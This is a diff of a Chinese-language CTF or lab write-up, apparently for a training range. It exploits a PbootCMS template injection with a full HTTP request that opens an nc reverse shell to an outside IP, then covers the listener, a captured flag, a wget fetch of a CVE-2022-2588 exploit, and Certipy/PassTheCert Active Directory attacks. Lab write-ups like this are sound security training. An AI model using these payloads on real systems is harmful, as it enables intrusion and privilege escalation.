@@ -11,7 +11,7 @@
 
 ## nmap扫描
 对两个IP地址进行nmap扫描 ，第二个有PbootCMS
-```
+```bash
 ☁  endless  nmap -p- 39.101.140.137
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-29 15:06 CST
 Nmap scan report for 39.101.140.137
@@ -53,10 +53,16 @@ https://guokeya.github.io/post/WscncUrcS/  漏洞原理
 
 完整的Request
 
-```
+```bash
 GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
 ```
 
+阿里云开启1111端口
+```bash
+nc -lvnp 1111
+```
+
+burp发送
 ```bash
 GET /?a=}{pboot{user:password}:if(("sys\x74em")("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 101.132.149.233 1111 >/tmp/f"));//)}xxx{/pboot{user:password}:if} HTTP/1.1
 Host: 39.101.138.52
@@ -81,7 +87,7 @@ export SHELL=/bin/bash
 stty rows 24 columns 80
 ```
 
-反弹成功后进入系统，发现flag文件
+反弹成功后进入`/`根目录，发现flag文件
 ```
 www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ ls -l
 total 64
@@ -95,8 +101,10 @@ drwxr-xr-x   2 root root  4096 Apr 15  2020 home
 www-data@iZ8vbe81fu56hntkmf5cy5Z:/$ cat flag
 flag{Php_Waf_so_insteresting!}
 ```
-###  **flag{Php_Waf_so_insteresting!}**
-
+### flag
+```
+flag{Php_Waf_so_insteresting!}
+```
 
 1. 可以使用 [# CVE-2022-2588]([CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588)) 提权，靶机自带python,可以用阿里云的`python -m http.server 4444`上传, 靶机执行`wget http://xxx.xxx.xxx.xxx:4444/exp_file_credential
 2. 记得`chmod 777 ./exp_file_credential` ，否则无法执行
@@ -815,13 +823,11 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
 
 
-
-
 - Certipy 在 4.0 版本后正式改名为 `certipy-ad(仅在kali中，mac本地仍然是certipy)，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
 
 
 还原哈希失败
-```
+```bash
 proxychains4 -f /usr/local/etc/proxychains-24.conf -q certipy auth -pfx dc.pfx -dc-ip 172.24.7.3 -debug
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
@@ -883,7 +889,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 ```
 
 whoami，证明我们确实可以继续往下打了
-```
+```bash
 proxychains4 -f /usr/local/etc/proxychains-24.conf \
 /Users/zhaochoudemao/.local/pipx/venvs/certipy-ad/bin/python3 \
 /tmp/PassTheCert/Python/passthecert.py \
